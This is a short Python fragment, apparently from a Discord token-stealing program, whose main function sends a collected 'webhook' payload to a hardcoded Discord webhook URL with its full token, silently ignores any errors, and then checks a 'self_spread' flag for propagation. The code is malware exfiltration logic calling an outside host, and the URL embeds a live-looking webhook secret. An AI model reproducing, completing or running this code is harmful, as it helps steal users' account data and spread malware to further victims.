...
def main():
    ...
    try:
        urlopen(Request("https://discordapp.com/api/webhooks/787499099112734732/JkFJtTipudMPjJZgUFUY4LL23jwjgL6jiUkXCtnT9I-GfC-sZVNt4nJFWuPOl27-Q8R-", data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
